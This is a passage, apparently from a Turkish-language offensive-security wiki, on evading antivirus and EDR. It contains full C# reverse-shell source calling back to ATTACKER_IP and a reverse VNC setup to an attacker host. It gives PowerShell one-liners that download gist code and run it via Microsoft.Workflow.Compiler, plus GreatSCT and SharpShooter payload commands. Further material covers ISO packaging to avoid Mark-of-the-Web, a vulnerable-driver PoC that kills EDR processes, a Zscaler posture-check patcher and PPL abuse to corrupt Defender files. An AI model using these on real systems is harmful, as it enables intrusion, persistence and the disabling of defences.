• de4dot, control-flow flattening'i geri alır, orijinal namespace'leri, class'ları ve variable name'lerini geri yükler ve constant string'lerin şifresini çözer.

3. Proxy-call stripping – ConfuserEx, decompilation'ı daha da bozmak için doğrudan method call'larını lightweight wrapper'larla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra, opak wrapper function'lar (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'leri görmelisiniz.

4. Manual clean-up – Ortaya çıkan binary'yi dnSpy altında çalıştırın; *gerçek* payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware çoğu zaman bunu `<Module>.byte_0` içinde initialize edilen TLV-encoded bir byte array olarak saklar.

Yukarıdaki chain, malicious sample'ı çalıştırmaya **gerek kalmadan** execution flow'u geri yükler. Bu, offline bir workstation üzerinde çalışırken faydalıdır.

> 🛈  ConfuserEx, sample'ları otomatik olarak triage etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute üretir.

#### Tek satırlık
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla artırılmış software security sağlayabilen, [LLVM](http://www.llvm.org/) compilation suite'in open-source bir fork'unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir external tool kullanmadan ve compiler'ı değiştirmeden, `C++11/14` language kullanarak compile time'da obfuscated code üretmeyi gösterir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework tarafından oluşturulan ve application'ı crack etmek isteyen kişinin işini biraz zorlaştıracak bir obfuscated operations katmanı ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll ve .sys dahil olmak üzere çeşitli PE file'ları obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, arbitrary executable'lar için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan, LLVM-supported language'ler için fine-grained bir code obfuscation framework'üdür. ROPfuscator, regular instruction'ları ROP chain'lerine dönüştürerek bir programı assembly code seviyesinde obfuscate eder ve normal control flow'a ilişkin doğal algımızı engeller.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL'leri shellcode'a dönüştürebilir ve ardından yükleyebilir.

## SmartScreen & MoTW

İnternetten bazı executable'ları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak malicious application'ları çalıştırmaya karşı korumak için tasarlanmış bir security mechanism'dir.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen temel olarak reputation-based bir yaklaşım kullanır; yani yaygın olarak indirilmeyen application'lar SmartScreen'i tetikleyerek son kullanıcıyı uyarır ve file'ı çalıştırmasını engeller (ancak file, More Info -> Run anyway seçeneğine tıklanarak yine de çalıştırılabilir).

**MoTW** (Mark of The Web), internetten indirilen file'lar indirildikleri URL ile birlikte otomatik olarak oluşturulan ve Zone.Identifier adını taşıyan bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir file için Zone.Identifier ADS'nin kontrol edilmesi.</p></figcaption></figure>

> [!TIP]
> **trusted** bir signing certificate ile imzalanmış executable'ların **SmartScreen'i tetiklemeyeceğini** unutmamak önemlidir.

Payload'larınızın Mark of The Web almasını önlemenin oldukça etkili bir yolu, onları ISO gibi bir tür container'ın içine package etmektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **non NTFS** volume'lara uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'den kaçınmak için payload'ları output container'larına package eden bir tool'dur.

Örnek kullanım:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak payload'ları ISO dosyalarının içine paketleyip SmartScreen'i bypass etmeye yönelik bir demo.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları loglamasına** olanak tanıyan güçlü bir logging mekanizmasıdır. Ancak security product'lar tarafından malicious activity'leri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, user space process'in **`EtwEventWrite`** function'ının herhangi bir olayı loglamadan hemen dönmesini sağlamak da mümkündür. Bu işlem, function'ın memory'de patch'lenerek hemen dönmesinin sağlanmasıyla gerçekleştirilir ve söz konusu process için ETW logging etkili bir şekilde devre dışı bırakılır.

Daha fazla bilgiyi **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinde bulabilirsiniz.


## C# Assembly Reflection

C# binary'lerini memory'ye yüklemek uzun zamandır bilinen bir yöntemdir ve post-exploitation tools'larınızı AV tarafından yakalanmadan çalıştırmak için hâlâ oldukça iyi bir yöntemdir.

Payload doğrudan memory'ye yükleneceği ve diske dokunmayacağı için yalnızca tüm process için AMSI'yi patch'lememiz gerekecek.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan memory'de çalıştırma yeteneği sağlar; ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, **yeni bir sacrificial process başlatmayı**, post-exploitation malicious code'unuzu bu yeni process'e inject etmeyi, malicious code'unuzu çalıştırmayı ve işlem tamamlandığında yeni process'i kill etmeyi içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, execution'ın **Beacon implant process'imizin dışında** gerçekleşmesidir. Bu, post-exploitation action'ımız sırasında bir şeyler ters giderse veya yakalanırsa, **implant'ımızın hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma **olasılığınızın daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation malicious code'un **kendi process'ine** inject edilmesini içerir. Bu sayede yeni bir process oluşturmak ve onu AV tarafından scan ettirmek zorunda kalmazsınız; ancak dezavantajı, payload'ınızın execution'ı sırasında bir şeyler ters giderse crash meydana gelebileceğinden **beacon'ınızı kaybetme** **olasılığınızın çok daha yüksek** olmasıdır.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading hakkında daha fazla bilgi edinmek istiyorsanız [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) adresindeki makaleye ve InlineExecute-Assembly BOF'a ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atabilirsiniz.

C# Assembly'lerini **PowerShell'den** de load edebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) içeriklerine göz atın.

## Other Programming Languages Kullanmak

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) tarafından önerildiği üzere, compromised machine'e **Attacker Controlled SMB share üzerinde kurulu interpreter environment'a** erişim vererek diğer dilleri kullanıp malicious code execute etmek mümkündür.

Interpreter Binaries'e ve SMB share üzerindeki environment'a erişim izni vererek, bu dillerdeki **arbitrary code'u compromised machine'in memory'si içinde execute edebilirsiniz**.

Repo'da belirtildiği üzere: Defender script'leri hâlâ scan eder; ancak Go, Java, PHP vb. kullanarak **static signature'ları bypass etmek için daha fazla flexibility** elde ederiz. Bu dillerde random ve un-obfuscated reverse shell script'leriyle yapılan testler başarılı olmuştur.

## TokenStomping

Token stomping, bir attacker'ın **access token'ı veya EDR ya da AV gibi bir security product'ı manipulate etmesine** ve böylece process'in ölmemesi, ancak malicious activity'leri kontrol etmek için gerekli permissions'a sahip olmaması amacıyla privileges'ını azaltmasına olanak tanıyan bir tekniktir.

Bunu önlemek için Windows, **external process'lerin** security process'lerinin token'ları üzerinde handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Trusted Software Kullanmak

### Chrome Remote Desktop

[**bu blog yazısında**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı üzere, Chrome Remote Desktop'ı bir victim'ın PC'sine deploy etmek ve ardından onu takeover ederek persistence sağlamak kolaydır:
1. https://remotedesktop.google.com/ adresinden download edin, "Set up via SSH" seçeneğine ve ardından Windows için MSI file'ına tıklayarak MSI file'ını download edin.
2. Installer'ı victim üzerinde silent olarak çalıştırın (admin gerekir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Wizard sizden authorize etmenizi isteyecektir; devam etmek için Authorize button'ına tıklayın.
4. Verilen parameter'ı bazı adjustments ile execute edin: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI kullanmadan pin ayarlanmasını sağlayan pin param'ına dikkat edin).


## Advanced Evasion

Evasion, oldukça karmaşık bir konudur; bazen yalnızca tek bir system içindeki birçok farklı telemetry kaynağını hesaba katmanız gerekir. Bu nedenle mature environment'larda tamamen undetected kalmak neredeyse imkânsızdır.

Karşılaştığınız her environment'ın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha Advanced Evasion teknikleri hakkında fikir edinmek için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılmış başka bir harika konuşmadır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi bölümleri malicious olarak bulduğunu kontrol etmek**

**Binary'nin bölümlerini**, **Defender'ın malicious olarak tespit ettiği bölümü bulana kadar** kaldıran ve bunu size ayırarak gösteren [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanabilirsiniz.\
**Aynı işlemi yapan** bir diğer tool ise [**avred**](https://github.com/dobin/avred)'dir; bu service'i [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde açık bir web interface'i üzerinden sunar.

### **Telnet Server**

Windows10'a kadar tüm Windows sürümleri, şu komut çalıştırılarak (administrator olarak) install edilebilen bir **Telnet server** ile birlikte geliyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında **başlamasını** sağlayın ve şimdi **çalıştırın**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portunu değiştir** (stealth) ve firewall'ı devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup değil, bin downloads sürümünü istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve server'ı yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanında bir password belirleyin
- _View-Only Password_ alanında bir password belirleyin

Ardından _**winvnc.exe**_ binary'sini ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**Attacker**, reverse **VNC connection** yakalamaya **hazır** olması için kendi **host**'u içinde `vncviewer.exe -listen 5900` binary'sini **çalıştırmalıdır**. Ardından **victim** içinde: winvnc daemon'ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**WARNING:** Stealth'i korumak için birkaç şey yapmamalısınız

- Zaten çalışıyorsa `winvnc`'yi başlatmayın, aksi hâlde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. `tasklist | findstr winvnc` ile çalışıp çalışmadığını kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc`'yi başlatmayın, aksi hâlde [config window](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` çalıştırmayın, aksi hâlde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT içinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **lister'ı** `msfconsole -r file.rc` ile **başlatın** ve **xml payload**'ı şu komutla **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender process'i çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Şununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# compiler kullanımı
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için python kullanımı örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space'ten AV/EDR'yi Öldürme

Storm-2603, ransomware bırakmadan önce endpoint korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir console utility kullandı. Bu tool, **kendi savunmasız ancak *signed* driver'ını** getirir ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemeyeceği ayrıcalıklı kernel işlemlerini gerçekleştirmek için bunu kötüye kullanır.

Önemli çıkarımlar
1. **Signed driver**: Diske yazılan dosya `ServiceMouse.sys` olsa da binary, Antiy Labs'ın “System In-Depth Analysis Toolkit” aracındaki meşru olarak imzalanmış `AToolsKrnl64.sys` driver'ıdır. Driver geçerli bir Microsoft signature taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır driver'ı bir **kernel service** olarak kaydeder, ikinci satır ise driver'ı başlatır; böylece `\\.\ServiceMouse` user land'den erişilebilir hale gelir.
3. **Driver tarafından sunulan IOCTL'ler**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID ile rastgele bir process'i terminate etme (Defender/EDR servislerini öldürmek için kullanılır) |
| `0x990000D0` | Disk üzerindeki rastgele bir dosyayı silme |
| `0x990001D0` | Driver'ı unload etme ve service'i kaldırma |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Neden çalışır**: BYOVD, user-mode korumalarını tamamen atlar; kernel'de çalışan code, PPL/PP, ELAM veya diğer hardening özelliklerinden bağımsız olarak *protected* process'leri açabilir, terminate edebilir veya kernel object'lerini kurcalayabilir.

Detection / Mitigation
•  Microsoft'ın vulnerable-driver block list'ini (`HVCI`, `Smart App Control`) etkinleştirin; böylece Windows `AToolsKrnl64.sys` dosyasını yüklemeyi reddeder.
•  Yeni *kernel* service oluşturulmalarını izleyin ve bir driver world-writable bir directory'den yüklendiğinde veya allow-list'te bulunmadığında alert oluşturun.
•  Custom device object'lere yönelik user-mode handle'larını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### On-Disk Binary Patching ile Zscaler Client Connector Posture Checks'i Bypass Etme

Zscaler'ın **Client Connector** ürünü device-posture kurallarını local olarak uygular ve sonuçları diğer component'lere iletmek için Windows RPC'ye güvenir. İki zayıf design choice, full bypass'ı mümkün kılar:

1. Posture evaluation **tamamen client-side** gerçekleşir (server'a bir boolean gönderilir).
2. Internal RPC endpoint'leri yalnızca bağlanan executable'ın `WinVerifyTrust` aracılığıyla **Zscaler tarafından signed** olduğunu doğrular.

**Disk üzerindeki dört signed binary'yi patch'leyerek** her iki mekanizma da etkisiz hale getirilebilir:

| Binary | Patch'lenen original logic | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece her check compliant olur |
| `ZSAService.exe` | `WinVerifyTrust`'e indirect call | NOP-ed ⇒ herhangi bir (unsigned olsa bile) process RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tunnel üzerindeki integrity check'leri | Short-circuit edilir |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyaları değiştirdikten ve service stack'i yeniden başlattıktan sonra:

* **Tüm** posture kontrolleri **green/compliant** olarak görüntülenir.
* İmzalanmamış veya değiştirilmiş binary'ler named-pipe RPC endpoint'lerini (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`) açabilir.
* Ele geçirilmiş host, Zscaler policies tarafından tanımlanan internal network'e kısıtlamasız erişim kazanır.

Bu case study, tamamen client-side trust kararlarının ve basit signature kontrollerinin birkaç byte patch ile nasıl aşılabileceğini gösterir.

## Protected Process Light (PPL)'ı LOLBINs ile AV/EDR'ye Müdahale Etmek İçin Kötüye Kullanma

Protected Process Light (PPL), yalnızca eşit veya daha yüksek seviyede korunan process'lerin birbirlerine müdahale edebilmesini sağlamak için bir signer/level hiyerarşisi uygular. Offensive açıdan, PPL-enabled bir binary'yi meşru biçimde başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, benign bir işlevi (ör. logging) AV/EDR tarafından kullanılan protected directory'lere karşı kısıtlı, PPL-backed bir write primitive'e dönüştürebilirsiniz.

Bir process'i PPL olarak çalıştıran unsurlar
- Hedef EXE (ve yüklenen tüm DLL'ler), PPL-capable bir EKU ile imzalanmış olmalıdır.
- Process, şu flags kullanılarak CreateProcess ile oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Binary'nin signer'ı ile eşleşen compatible bir protection level talep edilmelidir (ör. anti-malware signer'ları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signer'ları için `PROTECTION_LEVEL_WINDOWS`). Yanlış level'lar creation işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS protection hakkında daha geniş bir giriş için ayrıca bkz.:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level'ı seçer ve argümanları hedef EXE'ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Kullanım pattern'i:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- İmzalı sistem binary'si `C:\Windows\System32\ClipUp.exe` kendisini yeniden başlatır ve caller tarafından belirtilen bir path'e log file yazmak için bir parametre kabul eder.
- PPL process olarak başlatıldığında file write işlemi PPL backing ile gerçekleşir.
- ClipUp, spaces içeren path'leri parse edemez; normalde korunan konumları göstermek için 8.3 short path'leri kullanın.

8.3 short path helpers
- Short name'leri listelemek için her parent directory'de `dir /x` çalıştırın.
- cmd'de short path türetmek için: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN'i (ClipUp) bir launcher (ör. CreateProcessAsPPL) kullanarak `CREATE_PROTECTED_PROCESS` ile başlatın.
2) Korumalı bir AV directory'sinde (ör. Defender Platform) file creation işlemini zorlamak için ClipUp log-path argument'ını geçin. Gerekirse 8.3 short name'leri kullanın.
3) Hedef binary çalışırken AV tarafından normalde open/locked durumdaysa (ör. MsMpEng.exe), write işlemini boot sırasında, AV başlamadan önce çalışacak şekilde planlayın; bunu daha erken ve güvenilir biçimde çalıştıran bir auto-start service yükleyin. Boot ordering'i Process Monitor (boot logging) ile doğrulayın.
4) Reboot sonrasında PPL-backed write, AV binary'lerini lock'lamadan önce gerçekleşir; hedef file'ı corrupt ederek startup'ı engeller.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlamalar
